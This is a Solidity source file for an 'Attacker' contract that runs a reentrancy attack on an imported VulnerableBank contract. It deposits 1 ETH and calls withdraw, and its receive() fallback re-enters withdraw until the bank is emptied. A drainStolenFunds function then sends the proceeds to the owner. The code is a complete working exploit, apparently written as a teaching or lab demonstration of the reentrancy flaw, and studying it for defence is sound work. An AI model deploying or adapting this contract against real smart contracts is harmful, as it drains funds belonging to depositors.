// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public targetBank;
    address public owner;

    constructor(address _targetBank) {
        targetBank = VulnerableBank(_targetBank);
        owner = msg.sender;
    }

    // Step 1: Attack initiate (Withdraw call after 1 ETH deposit)
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        targetBank.deposit{value: 1 ether}();
        targetBank.withdraw();
    }

    // Step 2: The Malicious Fallback Hook
    // This executes immedieltly after that 1 ETH comes
    receive() external payable {
        if (address(targetBank).balance >= 1 ether) {
            targetBank.withdraw();
        }
    }

    // To withdraw stolen funds
    function drainStolenFunds() external {
        require(msg.sender == owner, "Only owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }
}